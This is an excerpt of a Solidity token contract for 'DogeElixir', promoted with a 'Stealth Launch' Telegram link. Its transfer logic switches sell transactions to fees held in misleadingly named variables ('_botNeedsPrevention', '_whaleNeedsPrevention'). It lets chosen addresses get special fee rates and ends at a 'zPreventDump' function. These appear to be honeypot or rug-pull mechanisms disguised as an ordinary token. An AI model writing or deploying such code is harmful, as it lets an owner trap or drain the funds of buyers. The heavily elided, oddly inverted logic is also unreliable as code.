...
Stealth Launch - https://t.me/dogeelixir
...
contract DogeElixir is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0xD5DDeDD6bdccfEcfe9801a71B9442A53edE3b269); // Marketing Address
    ...
    string private _name = "DogeElixir";
    string private _symbol = "$ELIXIR";
    ...
    uint256 private _jekpaFee = 2;
    uint256 private _previousjekpaFee = _jekpaFee;
    
    uint256 private _lpjekpa = 10;
    uint256 private _previouslpjekpa = _lpjekpa;
    
    uint256 private _buyjekpaFee = 2;
    uint256 private _buylpjekpa = 10;
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            ...
            if(from == uniswapV2Pair){
                removeAllFee();
                _jekpaFee = _buyjekpaFee;
                _lpjekpa = _buylpjekpa;
            }
            // Sell
            if(to == uniswapV2Pair){
                removeAllFee();
                _jekpaFee = _botNeedsPrevention;
                _lpjekpa = _whaleNeedsPrevention;
            }
            
            // If send account has a special fee 
            if(_addressFees[from].enable){
                removeAllFee();
                _jekpaFee = _addressFees[from]._jekpaFee;
                _lpjekpa = _addressFees[from]._lpjekpa;
                
                // Sell
                if(to == uniswapV2Pair){
                    _jekpaFee = _addressFees[from]._botNeedsPrevention;
                    _lpjekpa = _addressFees[from]._whaleNeedsPrevention;
                }
            }
            else{
                ...
                if(_addressFees[to].enable){
                    ...
                    removeAllFee();
                    if(from == uniswapV2Pair){
                        _jekpaFee = _addressFees[to]._buyjekpaFee;
                        _lpjekpa = _addressFees[to]._buylpjekpa;
                    }
                }
            }
        }
    ...
    function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256) {
        uint256 tFee = calculatejekpaFee(tAmount);
        uint256 tLiquidity = calculatelpjekpa(tAmount);
    ...
    function calculatejekpaFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_jekpaFee).div(
            10**2
        );
    }
    
    function calculatelpjekpa(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_lpjekpa).div(
            10**2
        );
    }
    
    function removeAllFee() private {
        if(_jekpaFee == 0 && _lpjekpa == 0) return;
        
        _previousjekpaFee = _jekpaFee;
        _previouslpjekpa = _lpjekpa;
    ...
    function restoreAllFee() private {
        _jekpaFee = _previousjekpaFee;
        _lpjekpa = _previouslpjekpa;
    }
    ...
    // Prevent Dump
    function zPreventDump() public deadCall {
